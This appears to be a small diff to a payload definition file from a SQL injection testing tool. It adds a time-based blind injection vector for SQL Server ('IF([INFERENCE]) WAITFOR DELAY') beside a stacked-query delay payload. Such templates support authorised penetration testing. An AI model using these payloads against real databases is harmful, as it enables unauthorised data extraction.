@@ -1310,7 +1310,7 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector></vector>
+        <vector>; IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]';</vector>
         <request>
             <payload>; WAITFOR DELAY '0:0:[SLEEPTIME]';</payload>
             <comment>--</comment>
